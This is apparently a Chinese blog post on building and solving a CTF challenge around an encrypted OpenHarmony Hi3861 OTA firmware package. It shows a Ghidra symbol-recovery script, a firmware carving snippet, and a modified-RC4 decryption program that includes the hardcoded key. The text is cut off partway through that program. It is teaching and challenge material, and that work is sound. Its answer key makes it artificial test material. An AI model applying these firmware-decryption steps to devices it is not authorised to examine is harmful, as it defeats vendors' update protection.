<figure class="highlight c"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">hi_u32 <span class="title function_">boot_upg_kernel_process</span><span class="params">(hi_u32 addr_start, hi_u32 addr_write)</span></span><br><span class="line">&#123;</span><br><span class="line">    hi_u32 uncompress_size;</span><br><span class="line">    hi_upg_section_head section_head = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    hi_u32 ret = hi_flash_read(addr_write + <span class="keyword">sizeof</span>(hi_upg_head), <span class="keyword">sizeof</span>(hi_upg_section_head), (hi_u8 *)(&amp;section_head));</span><br><span class="line">    <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (section_head.section0_compress == HI_FALSE) &#123;</span><br><span class="line">        boot_msg0(<span class="string">&quot;Not support uncompressed file.&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> HI_ERR_UPG_PARAMETER;</span><br><span class="line">    &#125;</span><br><span class="line">    hi_upg_file_head *file_head = boot_malloc(<span class="keyword">sizeof</span>(hi_upg_file_head));</span><br><span class="line">    <span class="keyword">if</span> (file_head == HI_NULL) &#123;</span><br><span class="line">        <span class="keyword">return</span> HI_ERR_UPG_MALLOC_FAIL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_FLASH_ENCRYPT_SUPPORT)</span></span><br><span class="line">    ret = boot_decrypt_upg_file(addr_write, &amp;section_head);</span><br><span class="line">    <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">        boot_msg1(<span class="string">&quot;decrypt upg file fail:&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    ret = boot_upg_lzma_verify(addr_write, &amp;uncompress_size, &amp;section_head, file_head);</span><br><span class="line">    <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">        boot_msg1(<span class="string">&quot;lzma verify fail:&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = boot_upg_lzma_detect(addr_write, &amp;uncompress_size, &amp;section_head);</span><br><span class="line">    <span class="keyword">if</span> (ret != HI_ERR_SUCCESS) &#123;</span><br><span class="line">        boot_msg1(<span class="string">&quot;detect2:&quot;</span>, ret);</span><br><span class="line">        <span class="keyword">goto</span> end;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* make 4K allignment for kernal and NV before compression. Erasing target space */</span></span><br><span class="line">    hi_u32 erase_size = uncompress_size;</span><br><span class="line">    erase_size = align_length(erase_size, ALIGNTYPE_4K);</span><br><span class="line">    ret = hi_flash_erase(addr_start, erase_size);</span><br><span class="line">    boot_msg4(<span class="string">&quot;info start-erasesize-write-uncompresssize:&quot;</span>, addr_start, erase_size, addr_write, uncompress_size);</span><br><span class="line">    <span class="comment">/* uncompress kernel and nv file to target space */</span></span><br><span class="line">    ret = boot_upg_copy_flash_2_flash(addr_write + section_head.section0_offset, section_head.section0_len,</span><br><span class="line">                                      addr_start, uncompress_size, section_head.section0_compress);</span><br><span class="line">    <span class="keyword">if</span> (ret == HI_ERR_SUCCESS) &#123;</span><br><span class="line">        boot_msg0(<span class="string">&quot;[bootupg kernel process]decompress success.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">end:</span><br><span class="line">    boot_upg_mem_free(file_head);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_FLASH_ENCRYPT_SUPPORT)</span></span><br><span class="line">    boot_decrypt_free_memory();</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以明显看到有对lzma格式解压的操作，所以只需要将编译产生的文件直接通过<code>HotaWrite</code>写入即可。</p>
<h4 id="3-升级包获取"><a href="#3-升级包获取" class="headerlink" title="3. 升级包获取"></a>3. 升级包获取</h4><p>需要有一个传输文件的功能，http&#x2F;串口传输？<br>实际上并不需要实现，因为如果能直接升级的话这个题目也就没有意义了…</p>
<h4 id="4-升级方式"><a href="#4-升级方式" class="headerlink" title="4. 升级方式"></a>4. 升级方式</h4><p>自定义一个shell命令ohota，然后执行命令可以触发解密+升级逻辑（当然真实环境因为没有实现升级包获取以及签名的公私钥不对，肯定是跑不通的）</p>
<h2 id="4-出题过程"><a href="#4-出题过程" class="headerlink" title="4. 出题过程"></a>4. 出题过程</h2><p><strong>题目思路</strong>：<br>提供未升级固件allinone、符号文件app.map、加密ota升级包，三个文件信息如下：</p>
<ul>
<li>未升级固件中包含ota加密升级包解密以及升级逻辑，但是本身无法直接运行解密，也就是会升级烧录失败；</li>
<li>app.map符号文件包含所有符号地址信息。可以用于地址恢复；</li>
<li>ota升级包内含有flag信息，想法是实现一个GetFlagTask，不断打印flag信息，当然是明文信息存储，直接逆向就行，无法烧录升级。<br>需要逆向解密程序逻辑对加密ota升级包进行解密。</li>
</ul>
<p><strong>进展</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 打包未加密固件；<br>看到<code>/out</code>目录下有一个<code>Hi3861_wifiiot_app.out</code>，为elf可执行文件，应该就是烧录时的运行binary了。然后还有个<code>Hi3861_wifiiot_app_allinone.bin</code>是用于烧录的bin（可能应该作为提供的题目附件）。还有一个<code>Hi3861_wifiiot_app_ota.bin</code>值得注意。</li>
<li><input checked="" disabled="" type="checkbox"> 编写加解密程序，加密已有固件；<br>RSA签名认证+数字信封（RC4）？</li>
<li><input checked="" disabled="" type="checkbox"> 编写升级程序封装（可能还需要patch不能直接升级拿flag）；<br>已找到官方文档，不是很具体，但是至少说明可行；同时只要远程服务器地址不可达，就无法进行证书校验等一系列操作，就无法实现直接升级拿flag的操作。因此主要问题就在加解密程序编写与封装了。</li>
<li><input checked="" disabled="" type="checkbox"> 封装进固件，烧写进板子，实现功能；</li>
</ul>
<p>可以stripped掉；需要给shell；需要有升级包；需要实现代码。</p>
<ol>
<li>新的加密的升级包，里面实现了flagTask，每隔1s打印1次flag，当然明文存储，可以直接在解密后逆向获得。</li>
</ol>
<h3 id="0x01-实现shell"><a href="#0x01-实现shell" class="headerlink" title="0x01. 实现shell"></a>0x01. 实现shell</h3><p>有一个shell，实现基本的一些功能</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">- help	# 打印命令列表</span><br><span class="line">- ls</span><br><span class="line">- cat</span><br><span class="line">- rm</span><br><span class="line">- echo</span><br><span class="line">- touch</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ota <span class="keyword">function</span>, this <span class="keyword">function</span> is implemented <span class="keyword">in</span> 0x03</span></span><br><span class="line">- ohota	# oh_ota_upgrade</span><br></pre></td></tr></table></figure>

<p>简单实现了各类命令ls和touch，其中注意ls如果没有文件会报错。</p>
<img src="/posts/33a951e6/image-20250713221513563.png" class="" title="image-20250713221513563">

<h3 id="0x02-制作升级包"><a href="#0x02-制作升级包" class="headerlink" title="0x02. 制作升级包"></a>0x02. 制作升级包</h3><p>似乎可以用ota.bin包来做升级包，具体怎么搞还不清楚。<br>copliot有一个很好的解释：</p>
<h3 id="0x03-编写升级程序"><a href="#0x03-编写升级程序" class="headerlink" title="0x03. 编写升级程序"></a>0x03. 编写升级程序</h3><p>自定义了一个命令<code>ohota</code>，该命令完成以下功能：</p>
<ol>
<li>从远程服务器获取升级包，公钥，用私钥加密的数字信封（保存了RC4密钥）</li>
<li>使用公钥解密获取对称密钥</li>
<li>RC4解密。</li>
</ol>
<blockquote>
<p>在这里的时候发现windows版的deveco device tool工具并没有做好windows适配，因此仍然是转去linux搭建环境了。</p>
</blockquote>
<p>升级包中getflag命令可以打印flag，解密固件成功后就可以看到明文了。</p>
<h3 id="0x04-实现加解密"><a href="#0x04-实现加解密" class="headerlink" title="0x04. 实现加解密"></a>0x04. 实现加解密</h3><p>选择稍微修改过的RC4算法</p>
<h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>rc4加密固件</p>
<h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><p>rc4解密固件</p>
<h2 id="解题过程（参考）"><a href="#解题过程（参考）" class="headerlink" title="解题过程（参考）"></a>解题过程（参考）</h2><h3 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h3><p>附件列表如下：</p>
<figure class="highlight shell"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line">❯ tree</span><br><span class="line">.</span><br><span class="line">├── Hi3861_wifiiot_app.map</span><br><span class="line">├── Hi3861_wifiiot_app_allinone.bin</span><br><span class="line">└── ota_file</span><br><span class="line">    └── updater_OpenHarmony_x.x.bin</span><br><span class="line"></span><br><span class="line">1 directory, 3 files</span><br></pre></td></tr></table></figure>
<h3 id="0x02-提取包含二进制代码语义的部分"><a href="#0x02-提取包含二进制代码语义的部分" class="headerlink" title="0x02. 提取包含二进制代码语义的部分"></a>0x02. 提取包含二进制代码语义的部分</h3><p>使用010Editor查看<code>Hi3861_wifiiot_app_allinone.bin</code>固件，该固件包含所有用于烧录的数据，其中包含了二进制代码语义部分。<br>比如搜索<code>ohota</code>命令字符串，可以看到存储的相应明文字符串：</p>
<img src="/posts/33a951e6/file-20250731202142156.png" class="">
<p>在提供的<code>Hi3861_wifiiot_app.map</code>中找到二进制代码中各个符号以及各个段的地址信息，可以用于后续的符号恢复以及反编译。如下为内存布局定义，这里我们关注代码语义部分，也就是前两个</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Memory Configuration</span><br><span class="line"></span><br><span class="line">Name             Origin             Length             Attributes</span><br><span class="line">BIN              0x000000000040d3c0 0x0000000000200000 xr</span><br><span class="line">ROM_TEXT         0x00000000003b8000 0x00000000000457e0 xr</span><br><span class="line">ROM_DATA0        0x000000000011d7c0 0x0000000000000020 xrw</span><br><span class="line">ROM_DATA1        0x000000000011d7e0 0x00000000000006e8 xrw</span><br><span class="line">ROM_BSS          0x000000000011a9c0 0x0000000000002e00 xrw</span><br><span class="line">STACK            0x00000000001185c0 0x0000000000002400 rw</span><br><span class="line">CHECK_INFO       0x000000000011dfc0 0x0000000000000040 rw</span><br><span class="line">FLASH            0x000000000040d3c0 0x00000000001f2c40 xrw</span><br><span class="line">PATCH_BSS        0x00000000000d8000 0x0000000000000400 xrw</span><br><span class="line">RAM              0x00000000000d8400 0x00000000000401c0 xrw</span><br><span class="line">EXTERN_ROM_DATA1_BSS 0x000000000011dec8 0x00000000000000f8 xrw</span><br><span class="line">*default*        0x0000000000000000 0xffffffffffffffff</span><br></pre></td></tr></table></figure>
<p>例如这里以getflag函数为例,在.map文件中定义如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">.rodata.getflag.str1.4</span><br><span class="line">               0x00000000004b236c       0x52 ohos/libs/libohos_shell_lib.a(libohos_shell_lib.ohos_shell.o)</span><br><span class="line">*fill*         0x00000000004b23be        0x2 </span><br></pre></td></tr></table></figure>

<p>表明getflag函数对应的数据段存放在0x4b236c-0x4b23be数据段，在allinone.bin中搜索getflag相关函数存放的字符串<code>Oops! I...</code><br>可以看到在allinone中存在相关字符串定义，并且地址为：<code>0xb5ff0</code></p>
<img src="/posts/33a951e6/file-20250801115124771.png" class="">
<p>然后在.map文件中可以看到.rodata.getflag.str1.4所在内存段.text_no_rom的起始地址和大小，由此可以计算其allinone中对应部分的偏移：0xb5ff0 - (0x4b236c - 0x40d3c0) &#x3D; 0x11044<br>也就是说从0x11044 - 0xb69a4为对应的.text_no_rom段，该段也对应了应有的主要逻辑。这里我们单独把这一份提取出来分析</p>
<figure class="highlight python"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;../Hi3861_wifiiot_app_allinone.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    binary_file_data = f.read()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Successfully read Hi3861_wifiiot_app_allinone data&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span> (<span class="string">&quot;./Hi3861_wifiiot_app_text_no_rom.bin&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(binary_file_data[<span class="number">0x11044</span>:<span class="number">0xb69a4</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Successfully write data&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="0x03-恢复代码语义"><a href="#0x03-恢复代码语义" class="headerlink" title="0x03. 恢复代码语义"></a>0x03. 恢复代码语义</h3><p>用ghidra打开，设置语言为Riscv default。<br>设置内存基址为0x40d3c0，这里仍以<code>Oops! I ...</code>字符串为例，其地址与map文件地址对应。</p>
<img src="/posts/33a951e6/file-20250801093818739.png" class="">
<p>然后即可恢复函数语义了，以getflag函数为例，其在.map文件里的符号地址为：0x00000000004a3852，因此在ghidra对应地址设置为函数，如下，可以看到能够基本恢复出函数结构。</p>
<img src="/posts/33a951e6/file-20250801115521105.png" class="">

<p>将.map文件中.text_non_rom段的text部分截出来进行批处理，构造ghidra脚本如下：</p>
<figure class="highlight java"><figcaption><span>showLineNumbers</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ghidra.app.script.GhidraScript;</span><br><span class="line"><span class="keyword">import</span> ghidra.program.model.address.Address;</span><br><span class="line"><span class="keyword">import</span> ghidra.program.model.listing.Function;</span><br><span class="line"><span class="keyword">import</span> ghidra.program.model.listing.Listing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Matcher;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RecoverFuncName</span> <span class="keyword">extends</span> <span class="title class_">GhidraScript</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// 提示用户选择符号文件（.map 文件）</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">mapFilePath</span> <span class="operator">=</span> askFile(<span class="string">&quot;Select .map file&quot;</span>, <span class="string">&quot;Open&quot;</span>).getAbsolutePath();</span><br><span class="line">        </span><br><span class="line">        <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(mapFilePath));</span><br><span class="line">        String line;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 两种正则表达式</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">singleLinePattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^\\s*\\.text\\.(\\S+)\\s+(0x[0-9a-fA-F]+)\\s+\\S+.*$&quot;</span>); <span class="comment">// 第二种格式</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">segmentPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^\\s*\\.text\\.(\\S+)$&quot;</span>); <span class="comment">// 第一种格式的段名行</span></span><br><span class="line">        <span class="type">Pattern</span> <span class="variable">addressPattern</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^\\s*(0x[0-9a-fA-F]+)\\s+\\S+\\s+.*$&quot;</span>); <span class="comment">// 第一种格式的地址行</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取程序的 Listing（代码和函数管理器）</span></span><br><span class="line">        <span class="type">Listing</span> <span class="variable">listing</span> <span class="operator">=</span> currentProgram.getListing();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">currentFuncName</span> <span class="operator">=</span> <span class="literal">null</span>;  <span class="comment">// 保存当前段的函数名</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 优先匹配第二种格式（单行定义）</span></span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">singleLineMatcher</span> <span class="operator">=</span> singleLinePattern.matcher(line);</span><br><span class="line">            <span class="keyword">if</span> (singleLineMatcher.find()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">funcName</span> <span class="operator">=</span> singleLineMatcher.group(<span class="number">1</span>);  <span class="comment">// 函数名</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">addressStr</span> <span class="operator">=</span> singleLineMatcher.group(<span class="number">2</span>);  <span class="comment">// 地址</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 转换地址字符串为 Address 对象</span></span><br><span class="line">                <span class="type">Address</span> <span class="variable">funcAddress</span> <span class="operator">=</span> toAddr(addressStr);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查地址是否已有函数存在</span></span><br><span class="line">                <span class="type">Function</span> <span class="variable">existingFunction</span> <span class="operator">=</span> listing.getFunctionAt(funcAddress);</span><br><span class="line">                <span class="keyword">if</span> (existingFunction != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 删除现有函数</span></span><br><span class="line">                    listing.removeFunction(funcAddress);</span><br><span class="line">                    println(<span class="string">&quot;Deleted existing function at &quot;</span> + funcAddress + <span class="string">&quot;: &quot;</span> + existingFunction.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建新的函数并设置函数名</span></span><br><span class="line">                createFunction(funcAddress, funcName);</span><br><span class="line">                println(<span class="string">&quot;Created function &quot;</span> + funcName + <span class="string">&quot; at &quot;</span> + funcAddress);</span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">// 处理完当前行，跳过后续逻辑</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 匹配第一种格式的段名行</span></span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">segmentMatcher</span> <span class="operator">=</span> segmentPattern.matcher(line);</span><br><span class="line">            <span class="keyword">if</span> (segmentMatcher.find()) &#123;</span><br><span class="line">                currentFuncName = segmentMatcher.group(<span class="number">1</span>);  <span class="comment">// 获取段名中的函数名</span></span><br><span class="line">                <span class="keyword">continue</span>; <span class="comment">// 等待下一行的地址行</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 匹配第一种格式的地址行</span></span><br><span class="line">            <span class="type">Matcher</span> <span class="variable">addressMatcher</span> <span class="operator">=</span> addressPattern.matcher(line);</span><br><span class="line">            <span class="keyword">if</span> (addressMatcher.find() &amp;&amp; currentFuncName != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">addressStr</span> <span class="operator">=</span> addressMatcher.group(<span class="number">1</span>);  <span class="comment">// 地址</span></span><br><span class="line"></span><br><span class="line">                <span class="comment">// 转换地址字符串为 Address 对象</span></span><br><span class="line">                <span class="type">Address</span> <span class="variable">funcAddress</span> <span class="operator">=</span> toAddr(addressStr);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 检查地址是否已有函数存在</span></span><br><span class="line">                <span class="type">Function</span> <span class="variable">existingFunction</span> <span class="operator">=</span> listing.getFunctionAt(funcAddress);</span><br><span class="line">                <span class="keyword">if</span> (existingFunction != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 删除现有函数</span></span><br><span class="line">                    listing.removeFunction(funcAddress);</span><br><span class="line">                    println(<span class="string">&quot;Deleted existing function at &quot;</span> + funcAddress + <span class="string">&quot;: &quot;</span> + existingFunction.getName());</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 创建新的函数并设置函数名</span></span><br><span class="line">                createFunction(funcAddress, currentFuncName);</span><br><span class="line">                println(<span class="string">&quot;Created function &quot;</span> + currentFuncName + <span class="string">&quot; at &quot;</span> + funcAddress);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 清除当前函数名，防止误用</span></span><br><span class="line">                currentFuncName = <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        reader.close();</span><br><span class="line">        println(<span class="string">&quot;Function recovery from .map file completed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>效果如下，可以将相关函数符号恢复出来：</p>
<img src="/posts/33a951e6/file-20250801110215477.png" class="">
<p>查看ohota命令对应反编译代码如下：</p>
<img src="/posts/33a951e6/file-20250801120025484.png" class="">
<p>可以发现有一个解密函数<code>OtaDecryptUpgradePackage</code>，对ota进行解密，解密完成后就是标准的ota过程。<br>当然存在一些func_0x003fa4ac函数，这些是标准库函数，定义在.text_rom段，可以手动改下名字恢复就行。</p>
<h3 id="0x04-解密ota升级包"><a href="#0x04-解密ota升级包" class="headerlink" title="0x04. 解密ota升级包"></a>0x04. 解密ota升级包</h3><p>查看<code>OtaDecryptUpgradePackage</code>函数，函数内容如下，可以看到开头有一个key，为rc4解密用到的，后面也传入了RC4Decrypt中。之后读取了ota文件内容，然后作RC4解密，while true循环应该是ghidra的bug，（编译生成的正常elf文件反编译也有这个问题），不过对理解解密函数语义影响不大（bushi</p>
<img src="/posts/33a951e6/file-20250801120130092.png" class="">
<p>跟入RC4Decrypt函数：</p>
<img src="/posts/33a951e6/file-20250801121033884.png" class="">
<p>RC4_Init函数，这里反编译有点问题，密钥对应a2，变量对应不正确（编译的elf文件也有这个问题，应该是ghidra本身对riscv的反编译仍然存在一点问题）。</p>
<img src="/posts/33a951e6/file-20250801145415016.png" class="">
<p>到正式解密的RC4_Crypt函数，这里相较于正常RC4在最后作了修改，很容易就能看到修改为多了个对tmp_key&#x3D;”an_ugly_tmp_key”的反序逐位异或，然后再取反。</p>
<img src="/posts/33a951e6/file-20250801152636044.png" class="">
<p>到这里就可以构造加解密脚本对ota目标文件进行解密了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> S[<span class="number">256</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, j;</span><br><span class="line">&#125; RC4_Context;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> rc4_key[<span class="number">11</span>] = <span class="string">&quot;Rc4K3Y114s&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_Init</span><span class="params">(RC4_Context *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *key, <span class="type">size_t</span> keylen)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> i, j = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        ctx-&gt;S[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        j = (j + ctx-&gt;S[i] + key[i % keylen]) % <span class="number">256</span>;</span><br><span class="line">        temp = ctx-&gt;S[i];</span><br><span class="line">        ctx-&gt;S[i] = ctx-&gt;S[j];</span><br><span class="line">        ctx-&gt;S[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ctx-&gt;i = <span class="number">0</span>;</span><br><span class="line">    ctx-&gt;j = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">RC4_Crypt</span><span class="params">(RC4_Context *ctx, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *input, <span class="type">unsigned</span> <span class="type">char</span> *output, <span class="type">size_t</span> length)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> temp;</span><br><span class="line">    <span class="type">size_t</span> k;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> * tmpkey = <span class="string">&quot;an_ugly_tmp_key&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; length; k++) &#123;</span><br><span class="line">        ctx-&gt;i = (ctx-&gt;i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">        ctx-&gt;j = (ctx-&gt;j + ctx-&gt;S[ctx-&gt;i]) % <span class="number">256</span>;</span><br><span class="line"></span><br><span class="line">        temp = ctx-&gt;S[ctx-&gt;i];</span><br><span class="line">        ctx-&gt;S[ctx-&gt;i] = ctx-&gt;S[ctx-&gt;j];</span><br><span class="line">        ctx-&gt;S[ctx-&gt;j] = temp;</span><br><span class="line"></span><br><span class="line">        output[k] = input[k] ^ ctx-&gt;S[(ctx-&gt;S[ctx-&gt;i] + ctx-&gt;S[ctx-&gt;j]) % <span class="number">256</span>] ^ <span class="number">0xff</span> ^ tmpkey[<span class="built_in">strlen</span>(tmpkey)-k%<span class="built_in">strlen</span>(tmpkey)<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取整个文件到缓冲区</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span>* <span class="title function_">read_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">size_t</span> *length)</span> &#123;</span><br><span class="line">    FILE *file = fopen(filename, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        perror(<span class="string">&quot;打开输入文件失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    *length = ftell(file);</span><br><span class="line">    rewind(file);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buffer = <span class="built_in">malloc</span>(*length);</span><br><span class="line">    <span class="keyword">if</span> (!buffer) &#123;</span><br><span class="line">        fclose(file);</span><br><span class="line">        perror(<span class="string">&quot;内存分配失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fread(buffer, <span class="number">1</span>, *length, file) != *length) &#123;</span><br><span class="line">        perror(<span class="string">&quot;读取文件失败&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="built_in">free</span>(buffer);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写入缓冲区到文件</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">write_file</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">size_t</span> length)</span> &#123;</span><br><span class="line">    FILE *file = fopen(filename, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!file) &#123;</span><br><span class="line">        perror(<span class="string">&quot;打开输出文件失败&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fwrite(data, <span class="number">1</span>, length, file) != length) &#123;</span><br><span class="line">        perror(<span class="string">&quot;写入文件失败&quot;</span>);</span><br><span class="line">        fclose(file);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(file);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;用法: %s [encrypt|decrypt] 输入文件 输出文件 密钥\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">        <span 